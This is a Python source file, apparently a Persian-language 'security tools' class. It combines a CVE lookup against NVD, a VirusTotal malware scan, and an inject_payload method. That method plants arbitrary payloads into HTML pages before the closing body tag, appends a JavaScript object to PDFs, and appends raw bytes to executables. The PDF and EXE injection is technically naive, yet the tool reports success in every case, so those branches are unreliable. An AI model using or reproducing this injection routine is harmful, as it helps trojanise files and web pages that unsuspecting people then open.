import requests
import os
import time
import hashlib

class SecurityTools:
    def __init__(self):
        self.nvd_api_key = "your_nvd_api_key_here"
        self.virustotal_api_key = "your_virustotal_api_key_here"

    def search_cve(self, cve_id):
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
            headers = {"apiKey": self.nvd_api_key}
            response = requests.get(url, headers=headers)
            response.raise_for_status()
            data = response.json()

            if data["totalResults"] == 0:
                return f"خطا: CVE با شناسه {cve_id} یافت نشد!"

            cve_data = data["vulnerabilities"][0]["cve"]
            description = cve_data["descriptions"][0]["value"]
            published_date = cve_data["published"]
            cvss_score = "نامشخص"
            severity = "نامشخص"

            if "metrics" in cve_data and "cvssMetricV31" in cve_data["metrics"]:
                cvss_score = cve_data["metrics"]["cvssMetricV31"][0]["cvssData"]["baseScore"]
                severity = cve_data["metrics"]["cvssMetricV31"][0]["cvssData"]["baseSeverity"]
            elif "metrics" in cve_data and "cvssMetricV2" in cve_data["metrics"]:
                cvss_score = cve_data["metrics"]["cvssMetricV2"][0]["cvssData"]["baseScore"]
                severity = cve_data["metrics"]["cvssMetricV2"][0]["baseSeverity"]

            return (
                f"جزئیات CVE: {cve_id}\n"
                f"توضیحات: {description}\n"
                f"تاریخ انتشار: {published_date}\n"
                f"امتیاز CVSS: {cvss_score}\n"
                f"شدت آسیب‌پذیری: {severity}"
            )
        except Exception as e:
            return f"خطا در جستجوی CVE: {str(e)}"

    def inject_payload(self, file_path, payload):
        if not os.path.exists(file_path):
            return f"خطا: فایل {file_path} یافت نشد!"

        try:

            file_extension = os.path.splitext(file_path)[1].lower()
            output_path = f"injected_{os.path.basename(file_path)}"

            if file_extension in [".html", ".htm"]:

                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                if "</body>" in content.lower():
                    content = content.replace("</body>", f"{payload}</body>", 1)
                else:
                    content += f"\n<body>{payload}</body>"
                with open(output_path, "w", encoding="utf-8") as f:
                    f.write(content)

            elif file_extension == ".pdf":

                with open(file_path, "rb") as f:
                    content = f.read()

                js_payload = f"\n<< /JS ({payload}) /S /JavaScript >>".encode()
                content += js_payload
                with open(output_path, "wb") as f:
                    f.write(content)

            elif file_extension == ".exe":

                with open(file_path, "rb") as f:
                    content = f.read()

                try:
                    payload_bytes = bytes.fromhex(payload.replace(" ", ""))
                except:
                    payload_bytes = payload.encode()
                content += payload_bytes
                with open(output_path, "wb") as f:
                    f.write(content)

            else:

                with open(file_path, "rb") as f:
                    content = f.read()
                try:
                    payload_bytes = bytes.fromhex(payload.replace(" ", ""))
                except:
                    payload_bytes = payload.encode()
                content += payload_bytes
                with open(output_path, "wb") as f:
                    f.write(content)

            return f"پیلود با موفقیت تزریق شد: {output_path}"
        except Exception as e:
            return f"خطا در تزریق پیلود: {str(e)}"

    def scan_malware(self, file_path):
        if not os.path.exists(file_path):
            return f"خطا: فایل {file_path} یافت نشد!"
        try:
            with open(file_path, "rb") as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()

            url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
            headers = {
                "x-apikey": self.virustotal_api_key,
                "Accept": "application/json"
            }
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                result = response.json()
                stats = result["data"]["attributes"]["last_analysis_stats"]
                return (
                    f"اسکن بدافزار: {file_path}\n"
                    f"تعداد موتورهای شناسایی‌کننده: {stats['malicious']}/{stats['harmless'] + stats['malicious'] + stats['suspicious']}\n"
                    f"وضعیت: {'بدافزار' if stats['malicious'] > 0 else 'بدون مشکل'}"
                )

            url = "https://www.virustotal.com/api/v3/files"
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                response = requests.post(url, headers=headers, files=files)
            response.raise_for_status()

            analysis_id = response.json()["data"]["id"]
            url = f"https://www.virustotal.com/api/v3/analyses/{analysis_id}"
            while True:
                response = requests.get(url, headers=headers)
                response.raise_for_status()
                result = response.json()
                status = result["data"]["attributes"]["status"]
                if status == "completed":
                    break
                time.sleep(5)

            stats = result["data"]["attributes"]["stats"]
            return (
                f"اسکن بدافزار: {file_path}\n"
                f"تعداد موتورهای شناسایی‌کننده: {stats['malicious']}/{stats['harmless'] + stats['malicious'] + stats['suspicious']}\n"
                f"وضعیت: {'بدافزار' if stats['malicious'] > 0 else 'بدون مشکل'}"
            )
        except Exception as e:
            return f"خطا در اسکن بدافزار: {str(e)}"